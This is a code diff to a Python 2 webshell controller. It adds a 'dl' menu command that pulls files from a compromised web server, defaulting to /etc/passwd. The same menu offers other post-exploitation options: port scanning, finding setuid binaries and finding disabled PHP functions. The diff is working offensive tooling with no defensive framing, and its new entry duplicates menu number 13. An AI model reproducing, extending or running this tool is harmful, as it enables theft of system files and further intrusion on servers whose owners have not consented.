@@ -37,6 +37,7 @@ def main_help():
     print "        11. [gdf] : get disabled function"
     print "        12. [ps] : port scan"
     print "        13. [fsb] : find setuid binaries"
+    print "        13. [dl] : download file"
     print "        14. [q|quit|exit] : quit"
 
 def main():
@@ -85,6 +86,11 @@ def main():
             webshell.get_writable_php_file()
         elif context == "fsb":
             webshell.get_suid_binaries()
+        elif context == "dl":
+            path = raw_input("Input path (/etc/passwd) : ") or ("/etc/passwd")
+            filename = path.split("/")[-1]
+            local_path = raw_input("Input local path (%s) : " % filename) or (filename)
+            webshell.download(path, local_path)
         elif context == "ps":
             hosts = raw_input("Input hosts (192.168.1.1/24) : ") or "192.168.1.1/24"
             if not "/" in hosts:
